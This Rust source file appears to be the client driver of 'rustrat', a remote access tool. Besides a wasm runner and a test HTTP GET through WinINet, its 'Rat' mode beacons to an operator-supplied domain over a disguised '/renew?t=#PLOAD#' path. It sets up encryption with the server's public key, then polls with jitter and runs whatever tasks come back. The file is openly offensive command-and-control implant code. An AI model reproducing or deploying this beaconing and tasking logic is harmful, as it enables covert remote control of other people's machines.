use rustrat_client::connector::http::*;
use rustrat_client::ffi::FnTable;
use rustrat_client::runtime;
use rustrat_client::runtime::strategy::Strategy;
use std::ffi::CString;
use std::str;
use std::{cell::RefCell, convert::TryInto, rc::Rc};

use base64;
use structopt::StructOpt;

#[derive(StructOpt)]
#[structopt(name = "rustrat-client", about = "Rustrat client testing tools.")]
enum RustratClient {
    /// Execute a wasm blob
    Wasm { path: String, fn_name: String },
    /// Make HTTP Get request to www.wodinaz.com
    Http,
    /// Connect to specified host and start executing tasks. Needs the domain to call back to and the server's base64 encoded public key
    Rat { domain: String, public_key: String },
}

pub fn do_http_get(
    host: String,
    path: String,
    is_https: bool,
) -> error::Result<(Vec<u8>, Vec<u8>)> {
    let fn_table = Rc::new(RefCell::new(FnTable::new()));
    register_wininet_fns(fn_table.clone())?;

    let ua = CString::new("Rustrat").unwrap();
    let host = CString::new(host).unwrap();
    let port = match is_https {
        true => 443,
        false => 80,
    };
    let verb = CString::new("GET").unwrap();
    let path = CString::new(path).unwrap();
    let mut flags = InternetUrlFlags::INTERNET_FLAG_NO_CACHE_WRITE
        | InternetUrlFlags::INTERNET_FLAG_NO_COOKIES
        | InternetUrlFlags::INTERNET_FLAG_PRAGMA_NOCACHE
        | InternetUrlFlags::INTERNET_FLAG_RELOAD;

    if is_https {
        flags = flags | InternetUrlFlags::INTERNET_FLAG_SECURE;
    }

    let internet_handle = InternetHandle::create(fn_table.clone(), &ua).unwrap();
    let mut request_handle = internet_handle
        .create_request(&host, port, &verb, &path, flags)
        .unwrap();

    request_handle
        .set_headers(&[CString::new("X-Foo: Test").unwrap()])
        .unwrap();

    let response_handle = request_handle.send_request(None)?;

    let headers = response_handle.get_response_headers()?;
    let body = response_handle.get_response()?;

    Ok((headers, body))
}

fn main() -> rustrat_client::error::Result<()> {
    init_log();

    let opt = RustratClient::from_args();

    match opt {
        RustratClient::Wasm { path, fn_name } => {
            let result = rustrat_client::run_webassembly_file(&path, &fn_name, |out| {
                println!("Print called from wasm with following value: {}", out);
            })?;
            std::process::exit(result);
        }

        RustratClient::Http => {
            let result = do_http_get("www.wodinaz.com".to_string(), "/".to_string(), true).unwrap();

            println!(
                "{}\n{}",
                str::from_utf8(&result.0).unwrap(),
                str::from_utf8(&result.1).unwrap()
            );
        }

        RustratClient::Rat { domain, public_key } => {
            let public_key: [u8; 32] = base64::decode_config(public_key, base64::URL_SAFE_NO_PAD)
                .unwrap()
                .try_into()
                .unwrap();

            let common_utils = runtime::CommonUtils::new();
            let crypto_configuration =
                runtime::CryptoConfiguration::new(&mut common_utils.get_rng(), public_key);

            let connector = runtime::connector::http::wininet::GetConnector::new(
                vec![CString::new(domain).unwrap()],
                vec!["/renew?t=#PLOAD#".to_string()],
                false,
                1337,
                vec![],
                CString::new("Rustrat/0.1").unwrap(),
                common_utils.clone(),
            );

            match runtime::strategy::polling::PollingRunner::checkin(
                Rc::new(RefCell::new(connector)),
                common_utils,
                crypto_configuration,
                60000,
                0.2,
            ) {
                Ok(runner) => {
                    runner.run();
                }
                Err(_) => {
                    log::error!("Unable to check in")
                }
            }
        }
    }

    Ok(())
}

#[cfg(debug_assertions)]
struct Logger;
#[cfg(debug_assertions)]
static LOGGER: Logger = Logger;

#[cfg(debug_assertions)]
impl log::Log for Logger {
    fn enabled(&self, metadata: &log::Metadata) -> bool {
        metadata.level() <= log::Level::Debug
    }

    fn log(&self, record: &log::Record) {
        println!(
            "[{}] {} - {}",
            record.level(),
            record.target(),
            record.args()
        );
    }

    fn flush(&self) {}
}

fn init_log() {
    #[cfg(debug_assertions)]
    let _ = log::set_logger(&LOGGER).map(|()| log::set_max_level(log::LevelFilter::Debug));
}
